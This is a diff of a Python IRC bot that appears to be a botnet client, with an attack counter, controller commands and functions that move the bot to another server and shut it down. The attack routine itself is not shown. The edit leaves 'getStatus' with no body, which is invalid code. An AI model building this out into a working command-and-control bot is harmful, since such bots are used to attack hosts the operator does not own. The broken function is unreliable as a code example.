@@ -26,6 +26,7 @@ conFlag = True #Check if controller is active
 # BOT INFO
 attackCounter = 0
 botNick = "IRCBOT "
+shutdownStatus = False # Only set to true if shutdown command is called
 
 # BOT JOINS A CHANNEL
 # https://pythonspot.com/en/building-an-irc-bot/
@@ -38,7 +39,7 @@ def joinIRC(IRCSOCKET, CHANNEL):
 
 # THESE ARE THE FUNCTIONS FOR THE COMMANDS
 def getStatus():    
-    return 
+    # Send botNick to controller. Also the attackCounter
 
 # Attack a host 
 # Increment counter if attack is successful
@@ -60,13 +61,43 @@ def cmdAttack(conNick, host, port):
 
 # Move to a different IRC server/channel
 def cmdMove(conNick, host, port, channel):
-    pass 
+    global HOST, PORT, CHANNEL, IRCSOCKET
+    
+    # Attempt new connection 
+    # Connect with the values passed in
+    # If successful, close global, passed values are now the global
+    try:
+        newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connectionFlag = serverConnect(newSocket, host, port)
+        if connectionFlag != False:
+            # Connection is succesful
+            # Send Private Msg to Controller for status (pass for now)
+            pass 
+            # Close original connection
+            IRCSOCKET.close()
+            # RESET GLOBAL TO NEW VALUES
+            HOST = host 
+            PORT = port 
+            CHANNEL = channel 
+            IRCSOCKET = newSocket 
+            return True 
+        else:
+            # Send Failure message to controller 
+            print("ERROR: Cannot enter new IRC server")
+            return False 
+    except:
+        # Send Failure message to controller
+        print("ERROR: Cannot enter new IRC server")
+        return False 
 
 def cmdQuit():
-    pass 
+    pass
 
 def cmdShutdown():
-    pass
+    global shutdownStatus 
+    shutdownStatus = True 
+    # Tell controller that the bot is shutting down 
+    return shutdownStatus 
 
 # SEND PRIVATE MESSAGE TO CONTROLLER
 def sendPrivate(conNick, msg):
